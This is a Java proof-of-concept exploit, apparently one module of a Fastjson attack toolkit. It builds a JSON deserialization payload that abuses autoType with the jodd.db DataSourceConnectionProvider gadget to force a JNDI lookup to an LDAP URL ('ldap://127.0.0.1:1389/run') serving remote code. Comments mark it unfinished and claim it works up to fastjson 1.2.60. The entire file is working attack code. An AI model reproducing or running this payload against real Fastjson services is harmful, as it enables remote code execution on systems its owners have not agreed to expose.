package fastjsonExp;

import jodd.db.connection.DataSourceConnectionProvider;
import utils.FastjsonVersionCtr;
import utils.StringUtils;


/**
 * 未完成
 * jodd.db
 * still work at fastjson 1.2.60
 * 没有无参构造函数怎么办？？？
 */

public class EXP4jodd_db {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"jodd.db.connection.DataSourceConnectionProvider\",\"dataSource\":\"replace_here\",\"connection\":\"a\"}";
    public  void actual_fun(String url) throws Exception {
        DataSourceConnectionProvider dataSourceConnectionProvider = new DataSourceConnectionProvider(url);

    }
    public  void actual_fun() throws Exception {
        if(!StringUtils.isNull(this.JNDI_URL)){
            this.actual_fun(this.JNDI_URL);
        }
    }
    public EXP4jodd_db(){}
    public EXP4jodd_db(String uri){
        this.JNDI_URL = uri;
        //String encodeUri = Base64.encodeToString(uri.getBytes());
        this.payload = this.payload.replace("replace_here",uri);

    }
    public String getPayload(){
        System.out.println(this.payload);
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.30");
        myFastjson.mySetAutoType(true);
        EXP4jodd_db exp = new EXP4jodd_db("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();

    }


}
